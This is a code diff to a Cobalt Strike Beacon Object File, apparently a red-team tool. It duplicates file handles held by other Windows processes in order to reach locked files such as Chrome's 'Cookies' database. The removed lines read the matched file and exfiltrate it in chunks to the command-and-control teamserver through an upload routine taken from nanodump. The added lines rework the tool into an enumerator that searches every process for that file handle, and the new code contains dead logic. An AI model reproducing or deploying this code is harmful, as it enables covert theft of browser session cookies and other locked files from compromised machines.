@@ -26,16 +26,16 @@ PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName) {
 
 extern "C" {
 #include "beacon.h"
-BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
-//Ran into overload issues when using DFR Macro for wcsstr/time. Switched to manual resolution isntead of using Macro for these two methods.
+    BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
+    //Ran into overload issues when using DFR Macro for wcsstr/time. Switched to manual resolution isntead of using Macro for these two methods.
 #ifndef _DEBUG
     WINBASEAPI wchar_t* __cdecl MSVCRT$wcsstr(const wchar_t* _Str, const wchar_t* _SubStr);
-    #define wcsstr MSVCRT$wcsstr
+#define wcsstr MSVCRT$wcsstr
     WINBASEAPI time_t __cdecl MSVCRT$time(time_t* time);
-    #define time MSVCRT$time
+#define time MSVCRT$time
     //wcstombs_s(&convertedChars, fileNameChar, bufferSize + 1, fileName.Buffer, bufferSize);
-    WINBASEAPI int __cdecl MSVCRT$wcstombs_s(size_t* preturnValue, char* mbstr, size_t sizeInBytes,const wchar_t* wcstr, size_t count);
-    #define wcstombs_s MSVCRT$wcstombs_s
+    WINBASEAPI int __cdecl MSVCRT$wcstombs_s(size_t* preturnValue, char* mbstr, size_t sizeInBytes, const wchar_t* wcstr, size_t count);
+#define wcstombs_s MSVCRT$wcstombs_s
 #endif
     DFR(KERNEL32, GetLastError);
     DFR(SHELL32, SHGetFolderPathA);
@@ -81,35 +81,23 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
     #define GetFileSize KERNEL32$GetFileSize
     #define wcstombs MSVCRT$wcstombs
     #define wcscmp MSVCRT$wcscmp
-    #define wcslen MSVCRT$wcslen
     #define GetFileType KERNEL32$GetFileType
+#define wcslen MSVCRT$wcslen
 
-    void go(char* buf,int len) {
+        void go(char* buf, int len) {
 
         DWORD pid = 0;
-        wchar_t* key = NULL;
-        wchar_t* value_wchar = NULL;
-        int value_int = 0;
+        wchar_t* filename = NULL;
+        wchar_t* processName = NULL;
         datap parser;
-        BOOL Success = false;
-
         BeaconDataParse(&parser, buf, len);
-        pid = BeaconDataInt(&parser);
-        key = (wchar_t*)BeaconDataExtract(&parser, NULL);
-        size_t keyLen = wcslen(key);
+        filename = (wchar_t*)BeaconDataExtract(&parser, NULL);
+        size_t filenameLen = wcslen(filename);
 
         //Value will either be a wchar_t or int based off wither key value filename or handle_id was chosen
-        if (!wcscmp(L"filename", key)) {
-            value_wchar = (wchar_t*)BeaconDataExtract(&parser, NULL);
-            size_t valueLen = wcslen(value_wchar);
-            BeaconPrintf(CALLBACK_OUTPUT, "Attempting file download of % .*S % .*S from Process ID %i", keyLen, key, valueLen, value_wchar, pid);
-        }
-        else {
-            value_int = BeaconDataInt(&parser);
-            BeaconPrintf(CALLBACK_OUTPUT, "Attempting file download using % .*S %i from Process ID %i", keyLen, key,value_int, pid);
-
-        }
-
+        processName = (wchar_t*)BeaconDataExtract(&parser, NULL);
+        size_t processLen = wcslen(processName);
+        BeaconPrintf(CALLBACK_OUTPUT, "Attempting to enumerate file handle to % .*S ", filenameLen, filename);
 
 
         DWORD dwErrorCode = ERROR_SUCCESS;
@@ -127,14 +115,6 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
         _NtQueryObject NtQueryObject = NULL;
         _RtlInitUnicodeString RtlInitUnicodeString = NULL;
         _NtClose NtClose = NULL;
-
-        //Obtain handle to process with handle duplication access
-        processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
-        if (NULL == processHandle) {
-            dwErrorCode = GetLastError();
-            BeaconPrintf(CALLBACK_ERROR, "Error: Failed to open process %i, error code %i",pid,dwErrorCode);
-            return;
-        }
 
         //Resolve NT API Function Addresses
         NtQuerySystemInformation = (_NtQuerySystemInformation)GetLibraryProcAddress("ntdll.dll", "NtQuerySystemInformation");
@@ -167,25 +147,36 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
             return;
         }
         //Iterate through System Handles
+        int prevPID = 0;
         for (int i = 0; i < handleInfo->HandleCount; i++) {
             SYSTEM_HANDLE_TABLE_ENTRY_INFO objHandle;
-            memset(&objHandle,0,sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
+            memset(&objHandle, 0, sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
             objHandle = handleInfo->Handles[i];
+            if (handleInfo->Handles[i].UniqueProcessId != prevPID) {
+                prevPID = handleInfo->Handles[i].UniqueProcessId;
+                if (processHandle) {
+                    NtClose(processHandle);
+                    processHandle = NULL;
+                }
+                processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handleInfo->Handles[i].UniqueProcessId);
+                if (NULL == processHandle) {
+                    dwErrorCode = GetLastError();
+                    BeaconPrintf(CALLBACK_ERROR, "Error: Failed to open process %i, error code %i", pid, dwErrorCode);
+                    continue;
+                }
 
-            //Check if handle belongs to provided PID
-            if (handleInfo->Handles[i].UniqueProcessId != pid) {
-                continue;
             }
+            else {
+                if (NULL == processHandle) {
+                    continue;
+                }
+            }
+
             //Check if handle type is of type file
             if (handleInfo->Handles[i].ObjectTypeIndex != HANDLE_TYPE_FILE) {
                 continue;
             }
-            //If using handle_id, we can determine early if it is the handle we are interested in
-            if (!wcscmp(L"handle_id", key)) {
-                if (value_int != handleInfo->Handles[i].HandleValue) {
-                    continue;
-                }
-            }
+
 
             UNICODE_STRING objectName;
             ULONG returnLength = 0;
@@ -207,18 +198,17 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
             }
 
             //Check Access Mask of handle, can run into issues with 0x001a019f or 0x0012019f
-            //GrantedAccess == 0x00120089 || curHandle->GrantedAccess == 0x0012019F || curHandle->GrantedAccess == 0x0012008D
             if (handleInfo->Handles[i].GrantedAccess == 0x001a019f || (handleInfo->Handles[i].HandleAttributes == 0x2 && handleInfo->Handles[i].GrantedAccess == 0x0012019f)) {
                 continue;
             }
-            
+
             DWORD currentID = handleInfo->Handles[i].UniqueProcessId;
- 
+
 
             //Duplicate Handle (Need DUPLICATE_SAME_ACCESS to be able to read from the file if it is locked.
             //Inherit Handle must be false for handle cleanup (When set to true, was unable to close handle after use). 
-            dwErrorCode = (DWORD)NtDuplicateObject(processHandle ,(HANDLE)handleInfo->Handles[i].HandleValue,GetCurrentProcess(),&dupHandle, 0, false, DUPLICATE_SAME_ACCESS);
-         
+            dwErrorCode = (DWORD)NtDuplicateObject(processHandle, (HANDLE)handleInfo->Handles[i].HandleValue, GetCurrentProcess(), &dupHandle, 0, false, DUPLICATE_SAME_ACCESS);
+
             //Check if handle was successfully duplicated
             if (dwErrorCode != STATUS_SUCCESS) {
                 continue;
@@ -228,7 +218,6 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
             if (fileType != FILE_TYPE_DISK) {
                 continue;
             }
-
             //Allocate memory for objectTypeInfo
             objectTypeInfo = (POBJECT_TYPE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
             //Check if memory was successfully allocated
@@ -238,24 +227,24 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
             }
 
             // Query the object type to get object type information
-            dwErrorCode = (DWORD)NtQueryObject(dupHandle,ObjectTypeInformation,objectTypeInfo,0x1000,NULL);
+            dwErrorCode = (DWORD)NtQueryObject(dupHandle, ObjectTypeInformation, objectTypeInfo, 0x1000, NULL);
             //Check if the object type was successfully queries
             if (dwErrorCode != STATUS_SUCCESS) {
                 continue;
             }
 
             //Allocate memory for object name info structure
-            objectNameInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,0x1000);
+            objectNameInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
             if (objectNameInfo == NULL) {
                 continue;
             }
-            
+
             //Retrieve object name info
-            dwErrorCode = (DWORD)NtQueryObject(dupHandle,ObjectNameInformation,objectNameInfo,0x1000,&returnLength);
+            dwErrorCode = (DWORD)NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
             if (dwErrorCode != STATUS_SUCCESS) {
 
                 // Reallocate the buffer and try again.
-                objectNameInfo = HeapReAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,objectNameInfo, returnLength);
+                objectNameInfo = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objectNameInfo, returnLength);
                 if (NULL == objectNameInfo) {
                     continue;
                 }
@@ -290,79 +279,24 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
                         break;
                     }
                 }
-                
+
                 // Check if the provided file name exists within the unicodeString
                 int result = 0;
-                if (value_wchar != NULL) {
+                if (filename != NULL) {
                     UNICODE_STRING substring;
-                    RtlInitUnicodeString(&substring, value_wchar);
+                    RtlInitUnicodeString(&substring, filename);
                     result = wcscmp(fileName.Buffer, substring.Buffer);
-                }
-
-                //wchar_t* result = wcsstr(objectName.Buffer, substring.Buffer);
-                if (!result) {
-                    Success = true;
-                    BeaconPrintf(CALLBACK_OUTPUT, "Found file handle!");
-                    //Get Size of File
-                    SetFilePointer(dupHandle, 0, 0, FILE_BEGIN);
-                    DWORD dwFileSize = GetFileSize(dupHandle, NULL);
-                    BeaconPrintf(CALLBACK_OUTPUT,"File size is %d\n", dwFileSize);
-                    //Allocate memory for buffer
-                    DWORD dwRead = 0;
-                    BOOL status = true;
-                    CHAR* buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
-                    status = ReadFile(dupHandle, buffer, dwFileSize, &dwRead, NULL);
-
-                    #ifdef _DEBUG
-                    // Construct the full path to the file on the desktop
-                    WCHAR filePath[MAX_PATH];
-                    wcscpy(filePath, L"C:\\Users\\defaultuser\\Desktop\\"); ///Select your own directory for debugging purposes
-                    wcscat(filePath, fileName.Buffer);
-
-                    // Create or open the file for writing
-                    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-
-                    if (hFile != INVALID_HANDLE_VALUE) {
-                        DWORD dwWritten = 0;
-                        // Write the contents of the buffer to the file
-                        BOOL writeStatus = WriteFile(hFile, buffer, dwRead, &dwWritten, NULL);
-
-                        if (writeStatus) {
-                            BeaconPrintf(CALLBACK_OUTPUT,"Data written to file successfully.\n");
-                         
-                        }
-                        else {
-                            BeaconPrintf(CALLBACK_ERROR,"Error: Failed to write data to file. Error code: %ul\n", GetLastError());
-                        }
-                        NtClose(hFile);
-                        hFile = NULL;
-                    }
-
-                    #else
-                    //Convert the wchar_t* string to a multibyte string using wcstombs_s
-                    const size_t bufferSize = wcstombs(NULL, fileName.Buffer, 0);
-                    if (bufferSize < 1) {
-                        BeaconPrintf(CALLBACK_ERROR, "Error: Unable to retrieve file size");
-                    }
-              
-                    char* fileNameChar = (char*)HeapAlloc(GetProcessHeap(), 0, bufferSize+1);  // +1 for null-terminator
-                    size_t convertedChars = 0;
-                    if (!wcstombs_s(&convertedChars, fileNameChar, bufferSize + 1, fileName.Buffer, bufferSize)) {
-                        //Upload file to cobalt strike using method from nanodump
-                        upload_file(fileNameChar, buffer, dwFileSize);
+                    //BeaconPrintf(CALLBACK_OUTPUT, "FileName: % .*S", fileName.Length, fileName.Buffer);
+                    result = wcscmp(fileName.Buffer, filename);
+                    if (!result) {
                         BeaconPrintf(CALLBACK_OUTPUT, "Process ID: %ld, [% #d] % .*S\n", handleInfo->Handles[i].UniqueProcessId, handleInfo->Handles[i].HandleValue, objectName.Length / 2, objectName.Buffer);
-
                     }
-                    else {
-                        BeaconPrintf(CALLBACK_ERROR, "Error: Failed to convert file name to char probably because im not the best coder");
-                    }
-                    #endif
-                    break;
                 }
+
             }
 
         }
-        if (Success == false) {
+        if (false) {
             BeaconPrintf(CALLBACK_OUTPUT, "Error: Failed to find file handle within the specified process");
         }
     cleanup:
@@ -389,101 +323,8 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
             dupHandle = NULL;
         }
         return;
-
-        //NtQuerySystemInformation won't give us the correct buffer size,
-        //so we guess by doubling the buffer size.
-       
-
-        //Enumerate handles within Chrome processes
     }
 
-
-    // https://github.com/helpsystems/nanodump/blob/3262e14d2652e21a9e7efc3960a796128c410f18/source/utils.c#L630-L728
-    BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength) {
-        DFR_LOCAL(MSVCRT, strnlen);
-        DFR_LOCAL(MSVCRT, srand);
-        DFR_LOCAL(MSVCRT, rand);
-        int fileNameLength = strnlen(fileName, 256);
-
-        // intializes the random number generator
-        time_t t;
-        srand((unsigned)time(&t));
-
-        // generate a 4 byte random id, rand max value is 0x7fff
-        ULONG32 fileId = 0;
-        fileId |= (rand() & 0x7FFF) << 0x11;
-        fileId |= (rand() & 0x7FFF) << 0x02;
-        fileId |= (rand() & 0x0003) << 0x00;
-
-        // 8 bytes for fileId and fileLength
-        int messageLength = 8 + fileNameLength;
-        char* packedData = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, messageLength);
-        if (!packedData) {
-            BeaconPrintf(CALLBACK_ERROR, "Error: Could not download the file");
-            return FALSE;
-        }
-
-        // pack on fileId as 4-byte int first
-        packedData[0] = (fileId >> 0x18) & 0xFF;
-        packedData[1] = (fileId >> 0x10) & 0xFF;
-        packedData[2] = (fileId >> 0x08) & 0xFF;
-        packedData[3] = (fileId >> 0x00) & 0xFF;
-
-        // pack on fileLength as 4-byte int second
-        packedData[4] = (fileLength >> 0x18) & 0xFF;
-        packedData[5] = (fileLength >> 0x10) & 0xFF;
-        packedData[6] = (fileLength >> 0x08) & 0xFF;
-        packedData[7] = (fileLength >> 0x00) & 0xFF;
-
-        // pack on the file name last
-        for (int i = 0; i < fileNameLength; i++) {
-            packedData[8 + i] = fileName[i];
-        }
-
-        // tell the teamserver that we want to download a file
-        BeaconOutput(CALLBACK_FILE, packedData, messageLength);
-        HeapFree(GetProcessHeap(), 0, packedData);
-        packedData = NULL;
-
-        // we use the same memory region for all chucks
-        int chunkLength = 4 + CHUNK_SIZE;
-        char* packedChunk = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, chunkLength);
-        if (!packedChunk) {
-            BeaconPrintf(CALLBACK_ERROR, "Error: Could not download the file");
-            return FALSE;
-        }
-        // the fileId is the same for all chunks
-        packedChunk[0] = (fileId >> 0x18) & 0xFF;
-        packedChunk[1] = (fileId >> 0x10) & 0xFF;
-        packedChunk[2] = (fileId >> 0x08) & 0xFF;
-        packedChunk[3] = (fileId >> 0x00) & 0xFF;
-
-        ULONG32 exfiltrated = 0;
-        while (exfiltrated < fileLength) {
-            // send the file content by chunks
-            chunkLength = fileLength - exfiltrated > CHUNK_SIZE
-                ? CHUNK_SIZE
-                : fileLength - exfiltrated;
-            ULONG32 chunkIndex = 4;
-            for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++) {
-                packedChunk[chunkIndex++] = fileData[i];
-            }
-            // send a chunk
-            BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, 4 + chunkLength);
-            exfiltrated += chunkLength;
-        }
-        HeapFree(GetProcessHeap(), 0, packedChunk);
-        packedChunk = NULL;
-
-        // tell the teamserver that we are done writing to this fileId
-        char packedClose[4];
-        packedClose[0] = (fileId >> 0x18) & 0xFF;
-        packedClose[1] = (fileId >> 0x10) & 0xFF;
-        packedClose[2] = (fileId >> 0x08) & 0xFF;
-        packedClose[3] = (fileId >> 0x00) & 0xFF;
-        BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
-        return TRUE;
-    }
 }
 
 // Define a main function for the bebug build
@@ -494,7 +335,7 @@ int main(int argc, char* argv[]) {
     // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
     //bof::runMocked<int, wchar_t*, wchar_t*>(go, 6696, L"filename", L"Cookies");
 
-    bof::runMocked<int, wchar_t*, int>(go,6328,L"handle_id",552);
+    bof::runMocked<wchar_t*,wchar_t*>(go, L"Cookies",L"/Process");
     return 0;
 }
 
